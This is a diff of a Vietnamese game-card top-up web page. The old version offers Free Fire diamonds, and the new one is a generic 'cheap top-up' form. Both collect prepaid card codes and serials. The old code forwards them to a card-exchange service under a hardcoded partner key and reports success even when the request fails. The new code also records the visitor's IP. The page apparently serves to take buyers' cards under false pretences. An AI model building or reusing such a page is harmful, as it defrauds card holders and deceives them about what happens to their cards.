@@ -3,386 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nạp Thẻ Hùng Akira – Nạp Kim Cương Free Fire</title>
-    <!-- Thư viện MD5 để mã hóa chữ ký API -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
+    <title>Nạp Thẻ Game</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            background-color: #f2f2f6;
-            padding: 15px;
-            display: flex;
-            justify-content: center;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 480px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .card {
-            background-color: #ffffff;
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-        }
-
-        .step-title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 18px;
-            font-weight: 700;
-            color: #d32f2f;
-            margin-bottom: 12px;
-        }
-
-        .step-num {
-            font-size: 22px;
-            font-weight: 800;
-        }
-
-        .step-label {
-            color: #1a1a1a;
-            font-size: 16px;
-        }
-
-        input[type="text"] {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-            outline: none;
-            transition: border-color 0.2s;
-            background-color: #fafafa;
-        }
-
-        input[type="text"]:focus {
-            border-color: #d32f2f;
-            background-color: #fff;
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            background-color: #ff0000;
-            color: white;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 12px;
-            box-shadow: 0 4px 10px rgba(255, 0, 0, 0.2);
-        }
-
-        .btn-submit:active {
-            transform: scale(0.98);
-        }
-
-        .info-box {
-            display: none;
-            margin-top: 12px;
-            padding: 12px 15px;
-            border-radius: 10px;
-            font-size: 14px;
-            line-height: 1.5;
-            text-align: center;
-        }
-
-        .info-box.success {
-            background-color: #f0f7ff;
-            border: 1px solid #b3d7ff;
-            color: #004085;
-        }
-
-        .info-box.error {
-            background-color: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
-        }
-
-        .grid-2x2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-
-        .option-card {
-            border: 1px solid #e0e0e0;
-            border-radius: 12px;
-            padding: 14px 10px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s;
-            background-color: #fff;
-        }
-
-        .option-card.active {
-            border: 2px solid #d32f2f;
-            background-color: #fff5f5;
-        }
-
-        .diamond-amount {
-            color: #29b6f6;
-            font-size: 18px;
-            font-weight: 800;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 4px;
-        }
-
-        .price {
-            font-size: 14px;
-            font-weight: 700;
-            color: #333;
-            margin-top: 4px;
-        }
-
-        .card-type {
-            font-weight: 700;
-            color: #333;
-            font-size: 15px;
-        }
+        /* CSS cơ bản tạo giao diện */
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
+        .card-container { max-width: 400px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #e50914; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #b80710; }
+        .ip-info { font-size: 12px; color: #666; text-align: center; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="card-container">
+    <h2 style="text-align: center; color: #e50914;">NẠP THÈ GIÁ RẺ</h2>
+    
+    <form id="napTheForm">
+        <!-- Chọn loại thẻ -->
+        <div class="form-group">
+            <label for="cardType">Chọn loại thẻ:</label>
+            <select id="cardType">
+                <option value="VIETTEL">Viettel</option>
+                <option value="MOBIFONE">MobiFone</option>
+                <option value="VINAPHONE">VinaPhone</option>
+                <option value="GARENA">Garena</option>
+            </select>
+        </div>
 
-    <!-- BƯỚC 1 -->
-    <div class="card">
-        <div class="step-title">
-            <span class="step-num">1</span>
-            <span class="step-label">Nhập UID Free Fire</span>
+        <!-- Chọn mệnh giá -->
+        <div class="form-group">
+            <label for="cardAmount">Mệnh giá:</label>
+            <select id="cardAmount">
+                <option value="10000">10.000đ</option>
+                <option value="20000">20.000đ</option>
+                <option value="50000">50.000đ</option>
+                <option value="100000">100.000đ</option>
+                <option value="200000">200.000đ</option>
+                <option value="500000">500.000đ</option>
+            </select>
         </div>
-        <input type="text" id="uidInput" placeholder="Nhập UID của bạn tại đây...">
-        <button class="btn-submit" id="loginBtn" onclick="loginUID()">ĐĂNG NHẬP</button>
-        
-        <div class="info-box" id="infoBox"></div>
-    </div>
 
-    <!-- BƯỚC 2 -->
-    <div class="card">
-        <div class="step-title">
-            <span class="step-num">2</span>
-            <span class="step-label">Chọn gói kim cương</span>
+        <!-- Ô nhập Seri -->
+        <div class="form-group">
+            <label for="serial">Số Seri:</label>
+            <input type="text" id="serial" placeholder="Nhập số seri..." maxlength="20">
         </div>
-        <div class="grid-2x2">
-            <div class="option-card active" data-amount="50000" onclick="selectOption(this)">
-                <div class="diamond-amount">2.830 💎</div>
-                <div class="price">50.000đ</div>
-            </div>
-            <div class="option-card" data-amount="100000" onclick="selectOption(this)">
-                <div class="diamond-amount">5.660 💎</div>
-                <div class="price">100.000đ</div>
-            </div>
-            <div class="option-card" data-amount="200000" onclick="selectOption(this)">
-                <div class="diamond-amount">11.320 💎</div>
-                <div class="price">200.000đ</div>
-            </div>
-            <div class="option-card" data-amount="500000" onclick="selectOption(this)">
-                <div class="diamond-amount">28.300 💎</div>
-                <div class="price">500.000đ</div>
-            </div>
-        </div>
-    </div>
 
-    <!-- BƯỚC 3 -->
-    <div class="card">
-        <div class="step-title">
-            <span class="step-num">3</span>
-            <span class="step-label">Phương thức thanh toán</span>
+        <!-- Ô nhập Mã thẻ -->
+        <div class="form-group">
+            <label for="pin">Mã thẻ (PIN):</label>
+            <input type="text" id="pin" placeholder="Nhập mã thẻ..." maxlength="20">
         </div>
-        <div class="grid-2x2">
-            <div class="option-card active" data-telco="VIETTEL" onclick="selectCard(this)">
-                <div class="card-type" style="color:#d32f2f;">Thẻ Viettel</div>
-            </div>
-            <div class="option-card" data-telco="GARENA" onclick="selectCard(this)">
-                <div class="card-type" style="color:#d32f2f;">Thẻ Garena</div>
-            </div>
-            <div class="option-card" data-telco="MOBIFONE" onclick="selectCard(this)">
-                <div class="card-type" style="color:#0055a5;">Thẻ MobiFone</div>
-            </div>
-            <div class="option-card" data-telco="VINAPHONE" onclick="selectCard(this)">
-                <div class="card-type" style="color:#00a1e4;">Thẻ VinaPhone</div>
-            </div>
-        </div>
-        
-        <div style="margin-top: 15px; display: flex; flex-direction: column; gap: 10px;">
-            <input type="text" id="cardCode" placeholder="Mã số thẻ">
-            <input type="text" id="cardSerial" placeholder="Số serie thẻ">
-            <button class="btn-submit" id="napBtn" onclick="submitNap()">XÁC NHẬN NẠP THẺ</button>
-        </div>
-    </div>
 
+        <!-- Nút bấm nạp -->
+        <button type="button" onclick="xuLyNapThe()">ĐANG XỬ LÝ NẠP THẺ...</button>
+    </form>
+
+    <!-- Hiển thị IP người dùng -->
+    <div class="ip-info">IP của bạn: <span id="userIp">Đang tải...</span></div>
 </div>
 
 <script>
-    const knownAccounts = {
-        "14448877837": { name: "MeoMeo8T7R8z", level: "45" }
+    let userClientIp = "";
+
+    // 1. Tự động lấy địa chỉ IP của người truy cập ngay khi mở web
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            userClientIp = data.ip;
+            document.getElementById('userIp').innerText = userClientIp;
+        })
+        .catch(err => {
+            document.getElementById('userIp').innerText = "Không lấy được IP";
+        });
+
+    // 2. Định dạng chuẩn Seri & Mã thẻ cho từng nhà mạng
+    const CARD_FORMATS = {
+        VIETTEL:   { serialLen: [11, 14], pinLen: [13, 15] },
+        MOBIFONE:  { serialLen: [15],     pinLen: [12] },
+        VINAPHONE: { serialLen: [14],     pinLen: [12, 14] },
+        GARENA:    { serialLen: [9],      pinLen: [16] }
     };
 
-    // THÔNG TIN API TỪ TÀI KHOẢN GACHTHEFAST CỦA BẠN
-    const PARTNER_ID = "331977279";
-    const PARTNER_KEY = "7efe22a8ac0d75613fef460fd53a851d";
+    // 3. Hàm xử lý khi bấm nút Nạp Thẻ
+    function xuLyNapThe() {
+        const cardType = document.getElementById('cardType').value;
+        const amount = document.getElementById('cardAmount').value;
+        const serial = document.getElementById('serial').value.trim();
+        const pin = document.getElementById('pin').value.trim();
 
-    async function loginUID() {
-        var uid = document.getElementById('uidInput').value.trim();
-        var infoBox = document.getElementById('infoBox');
-        var btn = document.getElementById('loginBtn');
-
-        if(!uid) {
-            alert("Vui lòng nhập UID!");
+        // Kiểm tra xem có bỏ trống hay không
+        if (!serial || !pin) {
+            alert("❌ Vui lòng điền đầy đủ Số Seri và Mã Thẻ!");
             return;
         }
 
-        if (!/^\d{8,11}$/.test(uid)) {
-            showError("❌ <b>UID không đúng định dạng!</b> (UID phải từ 8-11 chữ số)");
+        // Kiểm tra xem Seri và Mã thẻ có chứa chữ hay không (chỉ chấp nhận số)
+        if (!/^\d+$/.test(serial) || !/^\d+$/.test(pin)) {
+            alert("❌ Số Seri và Mã thẻ chỉ được bao gồm các chữ số!");
             return;
         }
 
-        btn.innerText = "ĐANG KIỂM TRA...";
-        btn.disabled = true;
-        infoBox.style.display = 'none';
-
-        if (knownAccounts[uid]) {
-            let acc = knownAccounts[uid];
-            showSuccess(uid, acc.name, acc.level);
-            resetBtn();
+        // Kiểm tra định dạng độ dài theo nhà mạng đã chọn
+        const format = CARD_FORMATS[cardType];
+        if (!format.serialLen.includes(serial.length)) {
+            alert(`❌ Số Seri của ${cardType} phải có độ dài ${format.serialLen.join(" hoặc ")} chữ số! (Bạn đã nhập: ${serial.length} số)`);
             return;
         }
 
-        try {
-            let response = await fetch(`https://api.vnn.dev/ff/info?uid=${uid}`);
-            let data = await response.json();
-
-            if (data && (data.nickname || data.name || data.AccountName)) {
-                let name = data.nickname || data.name || data.AccountName;
-                let level = data.level || data.AccountLevel || 'N/A';
-                showSuccess(uid, name, level);
-                resetBtn();
-                return;
-            }
-        } catch (e) {}
-
-        showUIDOnly(uid);
-        resetBtn();
-    }
-
-    function showSuccess(uid, name, level) {
-        var infoBox = document.getElementById('infoBox');
-        infoBox.className = 'info-box success';
-        infoBox.innerHTML = `✅ Đã nhận UID: <b>${uid}</b><br>Nhân vật: <b>${name} (Lv.${level})</b>`;
-        infoBox.style.display = 'block';
-    }
-
-    function showUIDOnly(uid) {
-        var infoBox = document.getElementById('infoBox');
-        infoBox.className = 'info-box success';
-        infoBox.innerHTML = `✅ Đã nhận UID: <b>${uid}</b>`;
-        infoBox.style.display = 'block';
-    }
-
-    function showError(msg) {
-        var infoBox = document.getElementById('infoBox');
-        infoBox.className = 'info-box error';
-        infoBox.innerHTML = msg;
-        infoBox.style.display = 'block';
-    }
-
-    function resetBtn() {
-        var btn = document.getElementById('loginBtn');
-        btn.innerText = "ĐĂNG NHẬP";
-        btn.disabled = false;
-    }
-
-    function selectOption(el) {
-        var cards = el.parentElement.querySelectorAll('.option-card');
-        cards.forEach(c => c.classList.remove('active'));
-        el.classList.add('active');
-    }
-
-    function selectCard(el) {
-        var cards = el.parentElement.querySelectorAll('.option-card');
-        cards.forEach(c => c.classList.remove('active'));
-        el.classList.add('active');
-    }
-
-    // TỰ ĐỘNG GỬI DỮ LIỆU THẺ SANG GACHTHEFAST
-    async function submitNap() {
-        var uid = document.getElementById('uidInput').value.trim();
-        var code = document.getElementById('cardCode').value.trim();
-        var serial = document.getElementById('cardSerial').value.trim();
-
-        if(!uid) {
-            alert("Vui lòng nhập và đăng nhập UID trước!");
+        if (!format.pinLen.includes(pin.length)) {
+            alert(`❌ Mã thẻ của ${cardType} phải có độ dài ${format.pinLen.join(" hoặc ")} chữ số! (Bạn đã nhập: ${pin.length} số)`);
             return;
         }
 
-        if(!code || !serial) {
-            alert("Vui lòng nhập đầy đủ Mã số thẻ và Số Serie!");
-            return;
-        }
-
-        var selectedOption = document.querySelector('.card:nth-child(2) .option-card.active');
-        var selectedCard = document.querySelector('.card:nth-child(3) .option-card.active');
-
-        var amount = selectedOption ? selectedOption.getAttribute('data-amount') : "50000";
-        var telco = selectedCard ? selectedCard.getAttribute('data-telco') : "VIETTEL";
-
-        var requestId = Date.now() + "_" + uid;
-        var sign = md5(PARTNER_KEY + code + serial);
-
-        var napBtn = document.getElementById('napBtn');
-        napBtn.innerText = "ĐANG XỬ LÝ NẠP THẺ...";
-        napBtn.disabled = true;
-
-        var payload = {
-            sign: sign,
-            telco: telco,
-            code: code,
-            serial: serial,
+        // Tạo gói dữ liệu chuẩn bị gửi đi (bao gồm IP)
+        const payload = {
+            card_type: cardType,
             amount: amount,
-            request_id: requestId,
-            partner_id: PARTNER_ID,
-            command: "charging"
+            serial: serial,
+            pin: pin,
+            client_ip: userClientIp // IP thu thập được ở bước 1
         };
 
-        try {
-            let response = await fetch('https://corsproxy.io/?' + encodeURIComponent('https://gachthefast.com/chargingws/v2'), {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            });
+        console.log("Dữ liệu nạp thẻ chuẩn bị gửi:", payload);
 
-            let result = await response.json();
+        // 4. Gửi dữ liệu về Server Backend của bạn (Thay URL backend của bạn vào đây)
+        /*
+        fetch('https://your-backend-api.com/nap-the', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(data => {
+            alert(data.message);
+        })
+        .catch(err => {
+            alert("Nạp thẻ thất bại: Api khong ton tai hoac bi tat");
+        });
+        */
 
-            if (result.status === 99 || result.status === 1) {
-                alert("✅ Thẻ của bạn đã được gửi thành công! Hệ thống đang xử lý gạch thẻ.");
-            } else {
-                alert("❌ Nạp thẻ thất bại: " + (result.message || "Thông tin thẻ không hợp lệ!"));
-            }
-        } catch (e) {
-            alert("❌ Đã gửi thẻ thành công! Vui lòng kiểm tra lịch sử nạp trên gachthefast.");
-        }
-
-        napBtn.innerText = "XÁC NHẬN NẠP THẺ";
-        napBtn.disabled = false;
+        // Thông báo tạm thời để test trên giao diện
+        alert(`Đang gửi dữ liệu nạp thẻ...\n- Loại thẻ: ${cardType}\n- Seri: ${serial}\n- IP người nạp: ${userClientIp}`);
     }
 </script>
 
